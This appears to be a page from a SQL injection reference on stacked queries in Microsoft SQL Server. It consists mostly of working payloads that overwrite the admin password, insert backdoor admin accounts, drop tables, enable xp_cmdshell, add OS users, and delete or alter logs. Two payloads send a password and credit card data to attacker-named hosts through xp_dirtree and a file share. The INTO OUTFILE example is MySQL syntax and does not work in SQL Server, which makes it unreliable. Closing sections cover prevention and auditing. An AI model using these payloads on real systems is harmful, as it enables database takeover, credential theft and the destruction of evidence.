---
title: Stacked Queries
description: Using multiple SQL statements in a single MSSQL injection
category: Advanced Techniques
order: 15
tags: ["stacked queries", "multiple statements", "batch injection"]
lastUpdated: 2025-03-15
---

## Stacked Queries

Stacked queries (also known as batch queries or query stacking) allow attackers to execute multiple SQL statements in a single injection. This technique significantly expands the capabilities of SQL injection attacks in Microsoft SQL Server, enabling operations beyond simple data extraction.

### Basic Syntax

In SQL Server, multiple SQL statements can be separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE logs;
```

This executes two separate queries: first selecting data, then dropping a table.

### How Stacked Queries Work

When a database connector supports multiple statements, SQL Server will execute each statement sequentially. Stacked queries allow an attacker to:

1. Execute the original query (possibly modified)
2. Add a statement terminator (`;`)
3. Add additional SQL statements
4. Comment out any remaining code (`--`)

### Detection Testing

To test if stacked queries are possible:

```sql
' ; SELECT 1 --
' ; WAITFOR DELAY '0:0:5' --
```

If the application pauses for 5 seconds with the second payload, it likely supports stacked queries.

### Common Attack Patterns

#### Data Modification

```sql
-- Update data
' ; UPDATE users SET password='hacked' WHERE username='admin' --

-- Insert data
' ; INSERT INTO users (username, password, role) VALUES ('hacker', 'backdoor', 'admin') --

-- Delete data
' ; DELETE FROM audit_logs WHERE date < GETDATE() --
```

#### Schema Modification

```sql
-- Add column
' ; ALTER TABLE users ADD backdoor VARCHAR(100) --

-- Create new table
' ; CREATE TABLE backdoor (id INT IDENTITY(1,1), command VARCHAR(8000)) --

-- Drop table
' ; DROP TABLE sensitive_data --
```

#### Administrative Operations

```sql
-- Create database user
' ; EXEC sp_addlogin 'backdoor', 'password' --
' ; EXEC sp_addsrvrolemember 'backdoor', 'sysadmin' --

-- Enable xp_cmdshell
' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --
```

#### Executing System Commands

```sql
-- Using xp_cmdshell (if enabled)
' ; EXEC xp_cmdshell 'net user hacker password /add' --

-- Using SQL Agent job (if available)
' ; EXEC msdb.dbo.sp_add_job @job_name='hack', @description='Backdoor';
EXEC msdb.dbo.sp_add_jobstep @job_name='hack', @step_name='exec', @subsystem='CMDEXEC', @command='net user hacker password /add';
EXEC msdb.dbo.sp_start_job 'hack' --
```

#### Information Gathering

```sql
-- Extracting data to a readable location
' ; SELECT * FROM credit_cards INTO OUTFILE '\\attacker\share\data.txt' --

-- Using xp_dirtree to force DNS lookups for data exfiltration
' ; DECLARE @q VARCHAR(8000); SET @q = (SELECT TOP 1 password FROM users WHERE username='admin');
EXEC xp_dirtree '\\'+@q+'.attacker.com\share' --
```

### Advanced Techniques

#### Dynamic SQL Execution

```sql
-- Using EXEC to run dynamic SQL
' ; DECLARE @sql NVARCHAR(100); SET @sql = 'SELECT * FROM ' + 'users'; EXEC(@sql) --

-- Using sp_executesql for parameterized dynamic SQL
' ; EXEC sp_executesql N'SELECT * FROM users WHERE username = @user', N'@user NVARCHAR(50)', @user = 'admin' --
```

#### Transaction Manipulation

```sql
-- Handling transactions
' ; BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE account_id = 1234; COMMIT --

-- Rollback changes if there's an error
' ; BEGIN TRY BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE account_id = 1234; COMMIT; END TRY BEGIN CATCH ROLLBACK; END CATCH --
```

#### Error Handling

```sql
-- Using TRY...CATCH for error handling
' ; BEGIN TRY EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'dir C:\' --
```

#### Conditional Execution

```sql
-- Using IF statements for conditional execution
' ; IF (SELECT COUNT(*) FROM sysobjects WHERE name = 'sensitive_data') > 0 BEGIN SELECT * FROM sensitive_data END --
```

### Real-World Impact Examples

#### Data Theft

```sql
-- Extract all user data with credentials
' ; SELECT * FROM users WHERE 1=0; SELECT username, password, email FROM users; --
```

#### Backdoor Creation

```sql
-- Create persistent access
' ; IF NOT EXISTS (SELECT * FROM users WHERE username = 'backdoor')
BEGIN
  INSERT INTO users (username, password, role) VALUES ('backdoor', 'h4ck3d!', 'admin')
END --
```

#### Evidence Removal

```sql
-- Clean up traces
' ; DELETE FROM logs WHERE activity LIKE '%login%'; UPDATE logs SET timestamp = DATEADD(day, -30, timestamp) --
```

### Prevention Techniques

To prevent stacked query attacks:

1. Use parameterized queries or stored procedures instead of string concatenation

2. Use database connectors or configurations that limit multiple statements

   **Note:** `SqlConnection` in ADO.NET does not have a built-in property to disable batching. Stacked query prevention depends on the library or ORM layer:

   ```csharp
   // EF Core - Disable batching by setting MaxBatchSize to 1
   services.AddDbContext<MyDbContext>(options =>
       options.UseSqlServer(connectionString, sqlOptions =>
           sqlOptions.MaxBatchSize(1)));
   ```

   For raw ADO.NET with `SqlClient`, stacked queries are controlled by the query itself—always use parameterized queries rather than relying on connection-level settings.

3. Apply the principle of least privilege for database accounts

4. Implement input validation - both whitelist and blacklist approaches

5. Consider using ORMs that protect against SQL injection by design

### Defensive Implementation Examples

```csharp
// C# - Parameterized query (safe)
using (SqlConnection conn = new SqlConnection(connectionString))
{
    SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE username = @username", conn);
    cmd.Parameters.AddWithValue("@username", userInput);
    // ...
}

// PHP - Prepared statement (safe)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$userInput]);

// Node.js - Parameterized query (safe)
const query = 'SELECT * FROM users WHERE username = $1';
client.query(query, [userInput]);
```

### Detection and Response

To detect stacked query attacks:

1. Monitor for queries with multiple statement separators (`;`)
2. Look for schema modification statements in application contexts
3. Implement database activity monitoring
4. Set up auditing for sensitive operations:

```sql
-- Set up SQL Server auditing
CREATE SERVER AUDIT SecurityAudit TO FILE;
CREATE DATABASE AUDIT SPECIFICATION DbAuditSpec FOR SERVER AUDIT SecurityAudit
ADD (DATABASE_OBJECT_CHANGE_GROUP),
ADD (SELECT, UPDATE, INSERT, DELETE ON SCHEMA::dbo BY public);
```
